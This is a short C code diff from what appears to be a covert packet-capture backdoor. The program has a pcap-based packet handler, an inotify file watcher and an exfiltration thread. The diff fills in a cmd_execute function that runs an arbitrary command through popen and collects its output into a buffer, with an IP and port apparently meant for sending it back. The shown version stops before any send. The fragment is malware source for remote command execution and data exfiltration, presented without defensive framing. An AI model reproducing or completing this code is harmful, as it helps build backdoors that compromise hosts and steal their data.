@@ -76,10 +76,6 @@ void pcap_init(uint32 ipaddr, char *folder, int chan) {
 	pthread_join(exfil_thread, NULL);
 }
 
-void cmd_execute(char *command, u_int32_t ip, u_int16_t port) {
-
-}
-
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
 		const u_char *packet) {
 
@@ -225,6 +221,26 @@ void *exfil_watch(void *arg) {
 		error("exfil_watch(): inotify rm watch");
 	else
 		(close(fd)) error("exfil_watch(): close");
+
+}
+
+void cmd_execute(char *command, uint32 ip, uint16 port) {
+	FILE *fp;
+	char line[MAX_LEN];
+	char resp[MAX_LEN];
+	int tot_len;
+
+	memset(line, 0, MAX_LEN);
+	memset(resp, 0, MAX_LEN);
+
+// Run the command, grab stdout
+	fp = popen(command, "r");
+
+// Append line by line output into response buffer
+	while (fgets(line, MAX_LEN, fp) != NULL)
+		strcat(resp, line);
+
+	tot_len = strlen(resp) + 1;
 
 }
 
